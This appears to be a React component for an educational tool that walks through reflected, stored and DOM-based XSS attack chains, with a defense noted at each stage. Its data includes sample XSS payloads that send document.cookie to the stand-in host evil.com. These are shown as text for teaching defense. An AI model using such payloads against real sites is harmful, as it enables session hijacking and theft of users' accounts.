/**
 * SecurityAttackFlowVisualizer — XSS 攻击向量流程可视化
 *
 * 展示三种 XSS 攻击类型的完整攻击链：
 * - 反射型 XSS：恶意脚本通过 URL 参数注入，服务端反射回页面
 * - 存储型 XSS：恶意脚本存储到数据库，其他用户访问时触发
 * - DOM 型 XSS：恶意脚本通过 DOM 操作注入，不经过服务端
 *
 * 交互：点击攻击类型切换，展示「注入 → 传递 → 执行 → 窃取」四阶段流程 + 防御点。
 *
 * ⚠️ 教学模拟：所有载荷均为教学示例，不执行真实攻击。
 */
import { useState } from 'react'
import type {
  SecurityAttackFlowVisualizerData,
  AttackType,
  AttackTypeId,
} from '../../../lib/performance-security-visualization-types'
import { cn } from '../../../lib/utils'

interface SecurityAttackFlowVisualizerProps {
  data?: SecurityAttackFlowVisualizerData
}

/** 默认三种 XSS 攻击类型数据 */
const DEFAULT_ATTACK_TYPES: AttackType[] = [
  {
    id: 'reflected',
    name: '反射型 XSS',
    severity: 'high',
    trigger: '诱导用户点击恶意链接（URL 参数含脚本）',
    persistence: '非持久化（需用户点击恶意链接才触发）',
    impact: '窃取当前用户 Cookie/Session，执行钓鱼',
    color: '#f59e0b',
    stages: [
      {
        id: 'inject',
        name: '① 注入载荷',
        description: '攻击者构造恶意 URL，将脚本作为参数注入',
        payload: `https://bank.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`,
        codeLanguage: 'text',
        defense: '输入验证：服务端对 URL 参数做白名单校验，拒绝 < > " \' 等字符',
        color: '#f59e0b',
      },
      {
        id: 'deliver',
        name: '② 传递载荷',
        description: '受害者点击恶意链接，请求发送到服务端',
        payload: `GET /search?q=<script>... HTTP/1.1
Host: bank.com
Cookie: session=abc123`,
        codeLanguage: 'http',
        defense: 'CSP：限制脚本来源，拒绝内联脚本执行',
        color: '#a78bfa',
      },
      {
        id: 'execute',
        name: '③ 服务端反射',
        description: '服务端未过滤，将参数原样反射回 HTML，脚本执行',
        payload: `<div>搜索结果: <script>fetch('https://evil.com/steal?c='+document.cookie)</script></div>`,
        codeLanguage: 'html',
        defense: '输出编码：服务端对反射到 HTML 的内容做 HTML 实体编码（< → &lt;）',
        color: '#ec4899',
      },
      {
        id: 'steal',
        name: '④ 数据窃取',
        description: '脚本执行后窃取 Cookie 发送到攻击者服务器',
        payload: `// 攻击者服务器收到：
GET /steal?c=session=abc123 HTTP/1.1
// 攻击者获得受害者 Session`,
        codeLanguage: 'text',
        defense: 'Cookie 安全：HttpOnly 阻止 JS 读取 Cookie；SameSite 防止跨站携带',
        color: '#ef4444',
      },
    ],
  },
  {
    id: 'stored',
    name: '存储型 XSS',
    severity: 'critical',
    trigger: '攻击者在评论区/留言板提交恶意脚本',
    persistence: '持久化（存储在数据库，所有访问者都触发）',
    impact: '批量窃取所有访问用户 Cookie，蠕虫传播',
    color: '#ef4444',
    stages: [
      {
        id: 'inject',
        name: '① 注入载荷',
        description: '攻击者在评论区提交包含脚本的留言',
        payload: `<textarea>好文章！
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
</textarea>`,
        codeLanguage: 'html',
        defense: '输入过滤：服务端对用户提交内容做 HTML 净化（DOMPurify / sanitize-html）',
        color: '#ef4444',
      },
      {
        id: 'deliver',
        name: '② 持久化存储',
        description: '服务端未过滤，将恶意内容存入数据库',
        payload: `POST /api/comment HTTP/1.1
Content-Type: application/json

{ "content": "<img src=x onerror=\\"fetch('https://evil.com/steal?c='+document.cookie)\\">" }

// 服务端直接存入数据库，未净化`,
        codeLanguage: 'http',
        defense: '存储净化：入库前用白名单过滤 HTML 标签与属性',
        color: '#a78bfa',
      },
      {
        id: 'execute',
        name: '③ 批量触发',
        description: '其他用户访问评论页，恶意脚本在所有访问者浏览器执行',
        payload: `<!-- 受害者 A 访问评论页 -->
<div class="comment">
  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
</div>
<!-- 受害者 B、C... 同样触发 -->`,
        codeLanguage: 'html',
        defense: '输出编码：渲染时用 textContent 或 React 自动转义（{} 不会执行 HTML）',
        color: '#ec4899',
      },
      {
        id: 'steal',
        name: '④ 批量窃取',
        description: '所有访问者的 Cookie 被发送到攻击者服务器',
        payload: `// 攻击者服务器收到大量 Cookie：
GET /steal?c=session=userA HTTP/1.1
GET /steal?c=session=userB HTTP/1.1
GET /steal?c=session=userC HTTP/1.1
// 蠕虫传播：窃取的 Session 可继续发恶意评论`,
        codeLanguage: 'text',
        defense: 'Cookie 安全 + CSP + 定期审计：HttpOnly + Strict CSP + 内容安全审计',
        color: '#1a6cff',
      },
    ],
  },
  {
    id: 'dom',
    name: 'DOM 型 XSS',
    severity: 'high',
    trigger: '前端 JS 直接操作 DOM 将不可信数据写入 HTML',
    persistence: '非持久化（依赖前端 JS 逻辑漏洞）',
    impact: '绕过服务端防护，在客户端执行任意脚本',
    color: '#a78bfa',
    stages: [
      {
        id: 'inject',
        name: '① 注入载荷',
        description: '攻击者构造恶意 URL，通过 location.hash 传递载荷',
        payload: `https://app.com/page#<img src=x onerror=alert(document.cookie)>`,
        codeLanguage: 'text',
        defense: '输入验证：前端对 URL 参数/hash 做校验',
        color: '#a78bfa',
      },
      {
        id: 'deliver',
        name: '② 前端读取',
        description: '前端 JS 从 location.hash 读取数据，未经过服务端',
        payload: `// 前端 JS 读取 hash
const payload = location.hash.slice(1)
// payload = "<img src=x onerror=alert(document.cookie)>"`,
        codeLanguage: 'js',
        defense: 'Trusted Types：要求所有 DOM 写入经过类型检查，拒绝字符串直接注入',
        color: '#f59e0b',
      },
      {
        id: 'execute',
        name: '③ DOM 注入',
        description: '前端用 innerHTML 将不可信数据写入 DOM，脚本执行',
        payload: `// 危险：使用 innerHTML
document.getElementById('content').innerHTML = payload
// 脚本执行：onerror 触发 alert(document.cookie)`,
        codeLanguage: 'js',
        defense: '安全 API：用 textContent / createElement 代替 innerHTML；或用 DOMPurify 净化',
        color: '#ec4899',
      },
      {
        id: 'steal',
        name: '④ 数据窃取',
        description: '脚本执行后可执行任意操作，窃取数据',
        payload: `// 攻击者可：
// - 读取 document.cookie（若无 HttpOnly）
// - 修改页面内容钓鱼
// - 发起请求冒充用户
// - 植入键盘记录器`,
        codeLanguage: 'text',
        defense: '纵深防御：CSP + HttpOnly + Trusted Types + 安全 DOM API',
        color: '#ef4444',
      },
    ],
  },
]

const SEVERITY_LABEL: Record<string, string> = {
  high: '高危',
  critical: '严重',
}

const SEVERITY_COLOR: Record<string, string> = {
  high: '#f59e0b',
  critical: '#ef4444',
}

export function SecurityAttackFlowVisualizer({ data }: SecurityAttackFlowVisualizerProps) {
  const attackTypes = data?.attackTypes ?? DEFAULT_ATTACK_TYPES
  const chainNote =
    data?.chainNote ??
    'XSS 攻击链：注入 → 传递 → 执行 → 窃取。防御要点：输入净化（防注入）+ 输出编码（防执行）+ CSP（限制脚本源）+ HttpOnly Cookie（防窃取）。'
  const [selectedId, setSelectedId] = useState<AttackTypeId>('reflected')
  const selected = attackTypes.find((t) => t.id === selectedId)

  return (
    <div className="space-y-lg">
      {/* 攻击类型切换 */}
      <div className="flex flex-wrap gap-xs">
        {attackTypes.map((type) => {
          const isActive = selectedId === type.id
          return (
            <button
              key={type.id}
              onClick={() => setSelectedId(type.id)}
              className={cn(
                'rounded-sm border px-md py-xs font-mono text-caption-mono-sm transition-all',
                isActive
                  ? 'border-transparent text-white shadow-sm'
                  : 'border-hairline bg-canvas-card text-ink hover:border-ink/30',
              )}
              style={isActive ? { backgroundColor: type.color } : undefined}
            >
              {type.name}
            </button>
          )
        })}
      </div>

      {/* 攻击链说明 */}
      <p className="rounded-sm bg-canvas-soft px-md py-sm text-caption text-body italic">
        {chainNote}
      </p>

      {/* 选中类型概要 */}
      {selected && (
        <div
          className="rounded-md border-l-4 p-md"
          style={{ borderLeftColor: selected.color, backgroundColor: `${selected.color}10` }}
        >
          <div className="mb-sm flex flex-wrap items-center gap-sm">
            <h4 className="text-heading-4 text-ink">{selected.name}</h4>
            <span
              className="rounded-sm px-xs py-xxs font-mono text-caption-mono-xs text-white"
              style={{ backgroundColor: SEVERITY_COLOR[selected.severity] }}
            >
              {SEVERITY_LABEL[selected.severity]}
            </span>
          </div>
          <div className="grid grid-cols-1 gap-sm sm:grid-cols-3">
            <div className="rounded-sm border border-hairline bg-canvas px-md py-sm">
              <div className="font-mono text-caption-mono-xs uppercase tracking-[1.2px] text-body">
                触发方式
              </div>
              <p className="mt-xs text-body-sm text-ink">{selected.trigger}</p>
            </div>
            <div className="rounded-sm border border-hairline bg-canvas px-md py-sm">
              <div className="font-mono text-caption-mono-xs uppercase tracking-[1.2px] text-body">
                持久性
              </div>
              <p className="mt-xs text-body-sm text-ink">{selected.persistence}</p>
            </div>
            <div className="rounded-sm border border-hairline bg-canvas px-md py-sm">
              <div className="font-mono text-caption-mono-xs uppercase tracking-[1.2px] text-body">
                影响范围
              </div>
              <p className="mt-xs text-body-sm text-ink">{selected.impact}</p>
            </div>
          </div>
        </div>
      )}

      {/* 攻击流程四阶段 */}
      {selected && (
        <div className="space-y-xs">
          <div className="font-mono text-caption-mono-xs uppercase tracking-[1.2px] text-body-mid">
            攻击流程
          </div>
          <div className="space-y-xs">
            {selected.stages.map((stage, i) => (
              <div key={stage.id}>
                {/* 流程连接线 */}
                {i > 0 && (
                  <div className="flex items-center py-xxs">
                    <div className="ml-md h-xs w-xxs" style={{ backgroundColor: stage.color }} />
                    <span className="ml-xs font-mono text-caption-mono-xs text-body-mid">↓</span>
                  </div>
                )}
                {/* 阶段卡片 */}
                <div
                  className="rounded-md border-l-4 bg-canvas-card p-md"
                  style={{ borderLeftColor: stage.color }}
                >
                  <div className="flex flex-col gap-sm md:flex-row md:items-start">
                    {/* 左侧：阶段信息 */}
                    <div className="md:w-1/2">
                      <div className="flex items-center gap-sm">
                        <h5 className="text-heading-5 text-ink">{stage.name}</h5>
                      </div>
                      <p className="mt-xs text-body-sm text-body">{stage.description}</p>
                      {/* 防御点 */}
                      <div className="mt-sm rounded-sm bg-green-500/10 px-sm py-xs">
                        <span className="font-mono text-caption-mono-xs uppercase tracking-[1.2px] text-green-600">
                          🛡 防御
                        </span>
                        <p className="mt-xxs text-caption text-ink">{stage.defense}</p>
                      </div>
                    </div>
                    {/* 右侧：载荷示例 */}
                    <div className="md:w-1/2">
                      <div className="font-mono text-caption-mono-xs uppercase tracking-[1.2px] text-body-mid">
                        载荷示例
                      </div>
                      <pre className="mt-xs overflow-x-auto rounded-sm bg-ink px-md py-sm font-mono text-caption-mono-xs text-canvas">
                        <code>{stage.payload}</code>
                      </pre>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      <p className="text-center text-caption-mono-xs text-body-mid">
        ⚠️ 教学模拟 · 所有载荷为示例，不执行真实攻击
      </p>
    </div>
  )
}
